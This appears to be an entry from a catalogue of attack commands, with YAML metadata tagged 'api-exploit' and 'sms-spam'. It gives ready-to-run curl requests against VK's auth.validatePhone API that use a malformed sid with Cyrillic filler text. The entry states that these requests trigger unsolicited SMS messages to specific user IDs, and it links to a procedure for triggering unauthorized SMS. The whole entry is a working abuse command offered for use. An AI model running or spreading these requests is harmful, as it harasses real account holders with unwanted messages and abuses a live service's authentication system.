---
id: cmd-vk-unicode-sms-001
data: 'curl "https://api.vk.com/method/auth.validatePhone?sid=2fa_66748_блаблабла"'
tags:
  - api-exploit
  - sms-spam
  - unicode
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:01.679Z'
verified: false
validated: true
submitted: true
---
# vk-auth-validatephone-unicode-sms

## Command

```bash
curl "https://api.vk.com/method/auth.validatePhone?sid=2fa_66748_блаблабла"
```

## Description

Triggers an SMS to user ID 66748 using a sid with Unicode arbitrary text, demonstrating the validation flaw accepts non-ASCII characters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `sid` | Malformed sid '2fa_66748_блаблабла' where 'блаблабла' is Unicode text | Yes |

## Examples

### Basic Usage

```bash
curl "https://api.vk.com/method/auth.validatePhone?sid=2fa_66748_блаблабла"
```

### Advanced Usage

With other Unicode:

```bash
curl "https://api.vk.com/method/auth.validatePhone?sid=2fa_99999_тест"
```

## Expected Output

Successful API response without validation errors, resulting in SMS delivery to user 66748.

## Related

- [[commands/vk-auth-validatephone-sms-spam]]
- [[procedures/Trigger-Unauthorized-SMS-Via-Malformed-SID]]
